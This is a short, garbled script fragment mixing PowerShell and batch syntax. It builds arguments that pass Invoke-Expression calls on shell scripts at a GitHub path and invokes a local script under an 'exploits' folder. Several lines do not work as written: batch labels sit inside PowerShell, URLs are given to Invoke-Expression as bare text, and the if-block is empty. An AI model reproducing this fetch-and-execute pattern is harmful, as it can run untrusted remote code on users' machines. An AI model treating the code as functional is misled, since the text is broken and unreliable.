$argsVar = "-cmd=[Invoke-Expression github.com/Niosem/Safler/shell/MadDash.cmd] 
           -autotab=[Invoke-Expression github.com/Niosem/Safler/shell/MadDash.AutoTab.cmd]"

Invoke-Expression ./exploits/OverTheBatch/main.ps1 
    if ($CMDProcess.ShouldProcess("tab.exe -cmd:pshell:profile:3 -Env:pshell:Profile:3=$argsVar", "return.exe -as_host")) {
}

:: Breakpoint if NHost is not running

:Exception-NHost-NotRunning
echo "NHost is not running. Please start NHost before continuing."